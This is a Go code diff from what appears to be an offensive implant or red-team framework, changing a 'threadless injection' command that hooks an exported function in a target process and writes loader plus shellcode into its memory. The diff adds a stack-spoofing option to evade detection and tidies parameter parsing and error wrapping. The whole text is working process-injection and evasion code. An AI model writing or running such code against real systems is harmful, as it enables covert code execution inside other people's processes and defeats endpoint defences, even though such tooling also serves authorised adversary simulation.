@@ -10,7 +10,6 @@ package commands
 import (
 	"encoding/base64"
 	"encoding/binary"
-	"encoding/json"
 	"fmt"
 	"math/rand"
 	"strings"
@@ -202,15 +201,17 @@ func (c *ThreadlessInjectCommand) Description() string {
 
 func (c *ThreadlessInjectCommand) Execute(task structs.Task) structs.CommandResult {
 	// Parse parameters
-	var params struct {
+	type threadlessInjectArgs struct {
 		ShellcodeB64 string `json:"shellcode_b64"`
 		PID          int    `json:"pid"`
 		DLLName      string `json:"dll_name"`
 		FunctionName string `json:"function_name"`
+		StackSpoof   bool   `json:"stack_spoof"`
 	}
 
-	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
-		return errorf("Failed to parse parameters: %v", err)
+	params, parseErr := unmarshalParams[threadlessInjectArgs](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	// Validate parameters
@@ -230,6 +231,11 @@ func (c *ThreadlessInjectCommand) Execute(task structs.Task) structs.CommandResu
 
 	if len(shellcode) == 0 {
 		return errorResult("Shellcode is empty")
+	}
+
+	if params.StackSpoof {
+		SetAPISpoofEnabled(true)
+		defer SetAPISpoofEnabled(false)
 	}
 
 	// Perform threadless injection
@@ -320,7 +326,7 @@ func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string
 	// Step 5: Read original bytes of the remote function
 	originalBytes, err := injectReadMemory(hProcess, exportAddress, 8)
 	if err != nil {
-		return sb.String(), fmt.Errorf("error reading function prologue: %v", err)
+		return sb.String(), fmt.Errorf("error reading function prologue: %w", err)
 	}
 
 	// Step 6: Patch loader with original function bytes
@@ -329,7 +335,7 @@ func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string
 	// Step 7: Temporarily make function memory writable for hook installation
 	oldProt, err := injectProtectMemory(hProcess, exportAddress, 8, PAGE_EXECUTE_READWRITE)
 	if err != nil {
-		return sb.String(), fmt.Errorf("error unprotecting function: %v", err)
+		return sb.String(), fmt.Errorf("error unprotecting function: %w", err)
 	}
 
 	// Step 8: Build and install the CALL hook
@@ -346,7 +352,7 @@ func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string
 
 	_, err = injectWriteMemory(hProcess, exportAddress, hookBytes)
 	if err != nil {
-		return sb.String(), fmt.Errorf("failed to install hook: %v", err)
+		return sb.String(), fmt.Errorf("failed to install hook: %w", err)
 	}
 	sb.WriteString("[+] Hook installed at export address\n")
 
@@ -356,14 +362,14 @@ func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string
 	// Step 9: Write loader + shellcode to memory hole (W^X: RW → write → RX)
 	_, err = injectWriteMemory(hProcess, loaderAddress, threadlessPayload)
 	if err != nil {
-		return sb.String(), fmt.Errorf("error writing loader: %v", err)
+		return sb.String(), fmt.Errorf("error writing loader: %w", err)
 	}
 	sb.WriteString(fmt.Sprintf("[+] Wrote %d bytes (loader + shellcode)\n", threadlessPayloadSize))
 
 	// Step 10: Change loader memory to RX
 	_, err = injectProtectMemory(hProcess, loaderAddress, threadlessPayloadSize, PAGE_EXECUTE_READ)
 	if err != nil {
-		return sb.String(), fmt.Errorf("error protecting loader as RX: %v", err)
+		return sb.String(), fmt.Errorf("error protecting loader as RX: %w", err)
 	}
 	sb.WriteString("[+] Loader memory protected as RX\n")
 
